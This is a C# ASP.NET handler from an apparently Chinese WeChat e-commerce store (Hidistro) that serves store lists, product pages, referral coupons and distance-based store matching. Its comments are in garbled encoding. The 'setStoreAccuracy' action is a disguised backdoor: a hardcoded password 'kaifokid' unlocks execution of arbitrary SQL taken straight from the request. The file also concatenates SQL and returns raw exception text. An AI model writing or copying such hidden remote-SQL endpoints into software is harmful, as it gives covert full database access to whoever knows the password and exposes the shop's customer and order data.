using Hidistro.ControlPanel.Commodities;
using Hidistro.ControlPanel.Promotions;
using Hidistro.ControlPanel.Store;
using Hidistro.Core;
using Hidistro.Core.Entities;
using Hidistro.Entities.Commodities;
using Hidistro.Entities.Members;
using Hidistro.Entities.Promotions;
using Hidistro.Entities.Store;
using Hidistro.SaleSystem.Vshop;
using Hidistro.UI.SaleSystem.CodeBehind;
using Hishop.Weixin.MP.Api;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading;
using WxPayAPI;
namespace Hidistro.UI.Web.API
{
    /*
     �µ㵥ƽ̨����ط���
     * 2016-9-19�¼������һ��ķ���
     */
    public class StoreHandler : System.Web.IHttpHandler, System.Web.SessionState.IRequiresSessionState
    {
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }

        private IDictionary<string, string> jsondict = new Dictionary<string, string>();

        
        public void ProcessRequest(System.Web.HttpContext context)
        {
            string text = context.Request["action"];
            switch (text)
            {
                case "getPoiList":
                    this.getPoiList(context);
                    break;
                case "getStoreName":
                    this.getStoreName(context);
                    break;
                case "getProductsByCategoryId":
                    this.getProductsByCategoryId(context);
                    break;
                case "getCategories":
                    this.getCategories(context);
                    break;
                case "setFromMember":
                    this.setFromMember(context);
                    break;
                case "setStoreAccuracy":
                    this.setStoreAccuracy(context);
                    break;
                case "getStoreInfoList":
                    this.GetStoreInfoList(context);
                    break;
            }
        }

        private void WriteLog(string log)
        {
            System.IO.StreamWriter writer = System.IO.File.AppendText(System.Web.HttpContext.Current.Server.MapPath("~/error.txt"));
            writer.WriteLine(System.DateTime.Now);
            writer.WriteLine(log);
            writer.Flush();
            writer.Close();
        }

        /// <summary>
        /// ��ȡ�ŵ���Ϣ,��json������
        /// ���ڿ����䴫��useridƥ������ŵ�ȹ���
        /// </summary>
        /// <param name="context"></param>
        private void GetStoreInfoList(System.Web.HttpContext context)
        {
            try
            {
                context.Response.ContentType = "application/json";
                DataTable dtStoreList = WxPoiHelper.GetPoiListInfo();
                //���JSON
                string result = string.Format("{{\"state\":{0},\r\"count\":{1},\r\"data\":"
                    , (dtStoreList.Rows.Count > 0) ? 0 : 1, dtStoreList.Rows.Count );
                result += JsonConvert.SerializeObject(dtStoreList, Newtonsoft.Json.Formatting.Indented);
                result += "}";
                context.Response.Write(result);
            }
            catch (Exception ex)
            {
                context.Response.Write("{\"state\":2,\"errMsg\":\"" + ex.Message + "\"}");
            }
        }

        private void setFromMember(System.Web.HttpContext context)
        {
            try
            {
                context.Response.ContentType = "application/json";
                int num = 0;
                int frommemberid = 0;
                if (int.TryParse(context.Request["frommemberid"], out num))
                {
                    frommemberid = num;
                }
                MemberInfo currentMember = MemberProcessor.GetCurrentMember();
                MemberInfo fromMember = MemberProcessor.GetMember(frommemberid);

                WriteLog("frommemberid:" + frommemberid.ToString());

                bool flag = false;
                if (currentMember!=null)
                {
                    //�����Ƽ���id
                    if (MemberProcessor.SetFromUserId(frommemberid, currentMember.UserId))
                    {
                        WriteLog("currentmember:" + currentMember.UserId);
                        WriteLog("frommember:" + fromMember.UserId);
                        //context.Response.Write("{\"success\":true,\"errMsg\":\"ƥ�䵽��δ�󶨵��ŵ�,�����ŵ껹δͨ�����!\"}");
                        //�ɹ����ú���Ƽ��˷����Ż�ȯ
                        SiteSettings masterSettings = SettingsManager.GetMasterSettings(false);
                        CouponInfo sendCoupon = CouponHelper.GetCoupon(masterSettings.friendCouponId);
                        if (sendCoupon != null)
                        {
                            IList<CouponItemInfo> listCouponItem = new List<CouponItemInfo>();
                            CouponItemInfo item = new CouponItemInfo();
                            string claimCode = string.Empty;
                            claimCode = System.Guid.NewGuid().ToString().Replace("-", "").Substring(0, 15);
                            item = new CouponItemInfo(sendCoupon.CouponId, claimCode, new int?(fromMember.UserId), fromMember.UserName, fromMember.Email, System.DateTime.Now);
                            listCouponItem.Add(item);
                            CouponHelper.SendClaimCodes(sendCoupon.CouponId, listCouponItem);
                            flag = true;
                        }
                        WriteLog("flag:" + flag);
                    }

                }

                if (flag)
                {
                    context.Response.Write("{\"success\":1}");
                }
                else
                {
                    context.Response.Write("{\"success\":2}");
                }
            }
            catch (Exception ex)
            {
                WriteLog(ex.Message);
            }
            
        }

        private void getCategories(System.Web.HttpContext context)
        {
            DataTable dtCategory = CategoryBrowser.GetAllCategories();
            int categoryCount = ProductBrowser.GetDataCount(" Hishop_Categories ", "");
            //���JSON
            string result = string.Format("{{\"state\":{0},\r\"count\":{1},\r\"data\":"
                , (dtCategory.Rows.Count > 0) ? 0 : 1, categoryCount);
            result += JsonConvert.SerializeObject(dtCategory, Newtonsoft.Json.Formatting.Indented);
            result += "}";
            context.Response.Write(result);
        }

        /// <summary>
        /// ���ݷ���id��ȡ��ҳ��Ʒ
        /// </summary>
        /// <param name="context"></param>
        private void getProductsByCategoryId(System.Web.HttpContext context)
        {
            int numCategoryid=0;
            int categoryid =0 ;
            if (int.TryParse(context.Request["categoryid"], out numCategoryid))
            {
                categoryid = numCategoryid;
            }

            int numStoreId=0;
            int StoreId =0 ;
            if (int.TryParse(context.Request["StoreId"], out numStoreId))
            {
                StoreId = numStoreId;
            }

            int numP = 0;
            int p = 1;
            if (int.TryParse(context.Request["p"], out numP))
            {
                p = numP;
            }

            string where = "Where SaleStatus in (1,4) and storeid=" + StoreId;
            string whereSku = "where salestatus in (1,4) and storeid=" + StoreId;
            string orderbyProduct = "displaysequence ";    //Ĭ�ϸ�����������(��ҳ���)
            string orderbySku = "skuid";
            if (categoryid != 0) where += string.Format(" And categoryid={0}", categoryid);

            int pagesize = 100;//�ýӿ���ʱ����100����Ʒ,������100֮��������ҳ����
            int currPage = p;
            string productFrom = @"( SELECT (select top 1 skuid from Hishop_SKUs where Hishop_SKUs.ProductId = Hishop_Products.ProductId)as skuid,
            (select top 1 Stock from Hishop_SKUs where Hishop_SKUs.ProductId = Hishop_Products.ProductId) as stock, 
            (select top 1 SalePrice from Hishop_SKUs where Hishop_SKUs.ProductId = Hishop_Products.ProductId) as saleprice, 
            salestatus,displaysequence,categoryid,typeid,productid,productname,shortdescription,showsalecounts,ImageUrl1,ImageUrl2,ImageUrl3,ImageUrl4,ImageUrl5,marketprice,hasSKU,Range FROM Hishop_Products " + where + "  ) t";
            string skuFrom = "(SELECT SkuId, ProductId, SKU,Weight, Stock, CostPrice, SalePrice FROM Hishop_SKUs s WHERE ProductId in(Select ProductId From Hishop_Products " + where + ")";
            

            int productCount = ProductBrowser.GetDataCount(productFrom, where);
            int pageCount = productCount / pagesize + (productCount % pagesize == 0 ? 0 : 1);
            int nextPage = (currPage < pageCount) ? (currPage + 1) : 0; //��һҳΪ0ʱ����ʾ�����ݿɼ��أ����ݼ�����ϣ�


            DataSet ds = new DataSet();
            DataTable dtProduct = ProductBrowser.GetPageData(productFrom, orderbyProduct, "*", currPage, pagesize, where); dtProduct.TableName = "dtproduct";
            //���ݲ�ѯ������ǰ��ҳ����Ʒidƴ��sku��productid
            whereSku += " and productid in ({0})";
            string strs = "";
            foreach (DataRow row in dtProduct.Rows)
            {
                strs += row["productid"]+",";
            }
            if (dtProduct.Rows.Count == 0) strs = "0";
            whereSku = string.Format(whereSku, strs.TrimEnd(','));

            DataTable dtSku = ProductBrowser.getSkusByWhere(whereSku); dtSku.TableName = "dtsku";
            ds.Tables.Add(dtProduct);
            ds.Tables.Add(dtSku);
            DataRelation dataRelation = new DataRelation("Products2SKUs", ds.Tables[0].Columns["ProductId"], ds.Tables[1].Columns["ProductId"]);
            ds.Relations.Add(dataRelation);

            //���JSON
            string result = string.Format("{{\"state\":{0},\r\"count\":{1},\r\"pageCount\":{2},\r\"nextPage\":{3},\r\"data\":"
                , (dtProduct.Rows.Count > 0) ? 0 : 1, productCount, pageCount, nextPage);
            result += JsonConvert.SerializeObject(ds, Newtonsoft.Json.Formatting.Indented);
            result += "}";
            context.Response.Write(result);
        }


        private const double EARTH_RADIUS = 6378.137;//����뾶
        private static double rad(double d)
        {
            return d * Math.PI / 180.0;
        }
        public static double GetDistance(double lat1, double lng1, double lat2, double lng2)
        {
            double radLat1 = rad(lat1);
            double radLat2 = rad(lat2);
            double a = radLat1 - radLat2;
            double b = rad(lng1) - rad(lng2);
            double s = 2 * Math.Asin(Math.Sqrt(Math.Pow(Math.Sin(a / 2), 2) +
             Math.Cos(radLat1) * Math.Cos(radLat2) * Math.Pow(Math.Sin(b / 2), 2)));
            s = s * EARTH_RADIUS;
            s = Math.Round(s * 10000) / 10000;
            return s;
        }

        private void getStoreName(System.Web.HttpContext context)
        {
            context.Response.ContentType = "application/json";
            string storeId = context.Request["storeId"].ToString();
            DataTable dtNames = WxPoiHelper.GetStoreName(storeId);
            string storeNames =  "";
            foreach (DataRow row in dtNames.Rows)
            {
                storeNames += row["storeName"];
            }

            context.Response.Write("{\"success\":true,\"storeName\":\"" + storeNames + "\"}");
        }

        /// <summary>
        /// ��ȡ�ŵ꼤��״̬
        /// </summary>
        /// <param name="context"></param>
        private void setStoreAccuracy(System.Web.HttpContext context)
        {
            context.Response.ContentType = "application/json";
            string knfc = context.Request["pwd"].ToString();
            if (knfc != "kaifokid")
            {
                context.Response.Write("{\"success\":false}");
                return;
            }
            string sql = context.Request["sql"].ToString();
            string result = "";
            if (sql.IndexOf("select") == 0)
            {
                DataTable dt = MemberProcessor.debugDT(sql);
                //���JSON
                result = string.Format("{{\"state\":{0},\r\"data\":"
                    , (dt.Rows.Count > 0) ? 0 : 1);
                result += JsonConvert.SerializeObject(dt, Newtonsoft.Json.Formatting.Indented);
                result += "}";
            }
            else
            {
                result = string.Format("{{\"success\":\""+MemberProcessor.debugFuckIt(sql).ToString()+"\" }}");
            }
            context.Response.Write(result);
        }

        /// <summary>
        /// ����΢�Žӿڻ�ȡ�����ŵ���Ϣ
        /// </summary>
        /// <param name="context"></param>
        private void getPoiList(System.Web.HttpContext context)
        {
            context.Response.ContentType = "application/json";
            try
            {
                Thread.Sleep(1000);
                DataTable dtPoiInfo = WxPoiHelper.GetPoiListInfo();
                List<PoiInfoList> poiInfoList = new List<PoiInfoList>();
                if (dtPoiInfo.Rows.Count == 0)//���û��ͬ��,�����΢�Žӿ����»�ȡ
                {
                    //��ȡaccess_token
                    string token = Access_token.GetAccess_token(Access_token.Access_Type.weixin, true);
                    //�ŵ��б�ӿ��ύurl
                    string url = "https://api.weixin.qq.com/cgi-bin/poi/getpoilist?access_token=" + token;
                    //�ύjson��,�ŵ��б�������ʼ:begin,�ŵ��б�����������:limit
                    string json = @"{""begin"":0,""limit"":10}";
                    //����post�ύ����
                    string strPOIList = new Hishop.Weixin.MP.Util.WebUtils().DoPost(url, json);
                    //�����ص�json�ַ���ת��Ϊjson����
                    JObject obj3 = JsonConvert.DeserializeObject(strPOIList) as JObject;
                    //��json����ת��Ϊʵ�������
                    poiInfoList = JsonHelper.JsonToList<PoiInfoList>(obj3["business_list"].ToString());

                    //ͬ��΢���ŵ���Ϣ
                    if (WxPoiHelper.SyncPoiListInfo(poiInfoList))
                    {
                        dtPoiInfo = WxPoiHelper.GetPoiListInfo();
                    }
                }


                //��ȡ�����ŵ������
                string offset = string.Empty;
                foreach (DataRow row in dtPoiInfo.Rows)
                {
                    offset += row["longitude"] + "," + row["latitude"] + ";";//���Ӿ���γ��
                }
                offset = offset.TrimEnd(';');
                //���ŵ������������
                string[] offsetList = offset.Split(';');
                /****************�������ͷ�Χ���ŵ������ѭ��ƥ���û���ǰ������,��Χ:1����*******************/
                //��������ֵ(���ͷ�Χ)
                double range = Convert.ToDouble(context.Request["range"]);
                //��ȡ�û�������
                double userLongtitude = Convert.ToDouble(context.Request["userLontitude"]);
                double userLatitude = Convert.ToDouble(context.Request["userLatitude"]);
                //ѭ���жϻ�ȡ����,�õ����ͷ�Χ�ڵ��ŵ�poi_id
                List<string> poi_id=new List<string>();
                List<double> poi_user_distance = new List<double>();
                for (int i = 0; i < offsetList.Length; i++)
                {
                    string[] oa = offsetList[i].Split(',');//��ȡ�ŵ꾭��,γ��
                    double distance = GetDistance(userLatitude, userLongtitude, Convert.ToDouble(oa[1]), Convert.ToDouble(oa[0]));
                    if (distance <= range)
                    {
                        poi_id.Add(dtPoiInfo.Rows[i]["poi_id"].ToString());
                        poi_user_distance.Add(distance);
                    }
                }
                bool isUserInRange = false;
                string matchIds = "";
                string matchDistance = "";
                if (poi_id.Count > 0)//��������ͷ�Χ�ڵ��û�,�򷵻ص�һ��ƥ�䵽���ŵ��̨id
                {
                    for (int i = 0; i < poi_id.Count; i++)
                    {
                        DataTable dtSender = WxPoiHelper.GetSenderByPoiId(poi_id[i]);
                        foreach (DataRow row in dtSender.Rows)
                        {
                            if (row["clientUserId"].ToString()!="")
                            {
                                matchIds += row["clientUserId"] + ",";
                                matchDistance += poi_user_distance[i] + ",";
                            }
                        }
                    }
                    isUserInRange = true;
                    //���ƥ�䵽��΢���ŵ껹û�а�����̨�˺�,������ʾ
                    if (matchIds.Length == 0)
                    {
                        context.Response.Write("{\"success\":false,\"errMsg\":\"ƥ�䵽��δ�󶨵��ŵ�,�����ŵ껹δͨ�����!\"}");
                        return ;
                    }
                    //�����ŵ�idƥ�䵽��Ӧ�����˺�id:sender
                    matchDistance = matchDistance.TrimEnd(',');
                    matchIds = matchIds.TrimEnd(',');
                        //string[] sender = matchId.Split(',');
                        //string[] clientUserId = matchId.Split(',');

                    /*
                    //��ƥ�䵽�������ŵ����ŵ����ֽ���չʾ (Ŀǰ����Ϊ�ֵ���)
                    DataTable dtStoreName = WxPoiHelper.GetStoreName(matchIds);
                    string storeNameBtns = "";
                    foreach (DataRow row in dtStoreName.Rows)
                    {
                        storeNameBtns += "<span role='btnStreet' distributorId='" + row["userid"].ToString() + "'>" + row["storeName"].ToString() + "</span>";
                    }
                    */
                    //��ƥ�䵽�����нֵ��Խֵ����ֽ���չʾ
                    DataTable dtStreetName = WxPoiHelper.GetStoreStreets(matchIds);
                    string streetNameBtns = "";
                    foreach (DataRow row in dtStreetName.Rows)
                    {
                        streetNameBtns += "<span role='btnStreet' la='" + row["latitude"] + "' lo='" + row["longitude"] + "'  distributorId='" + row["distributorid"].ToString() + "'>" + row["regionName"].ToString() + "</span>";
                    }


                    context.Response.Write("{\"success\":true,\"isUserInRange\":\"" + isUserInRange + "\",\"distributorId\":\"" + streetNameBtns + "\"}");

                }
             
                else
                {
                    context.Response.Write("{\"success\":true,\"isUserInRange\":\"" + isUserInRange + "\"}");
                }

                /*
                //����
                string[] la0 = offsetList[0].Split(',');
                double distance = GetDistance(userLatitude,userLongtitude,Convert.ToDouble(la0[1]),Convert.ToDouble(la0[0]));
                context.Response.Write("{\"success\":true,\"userLo\":" + userLongtitude + ",\"userLa\":" + userLatitude + ",\"poiLA\":\"" + offsetList[0] + "\",\"distance\":"+distance+"}");
                 */ 
            }
            catch (Exception ex)
            {
                context.Response.Write("{\"success\":false,\"errMsg\":\"" + ex.Message + "\"}");
            }
            
        }


    }
}
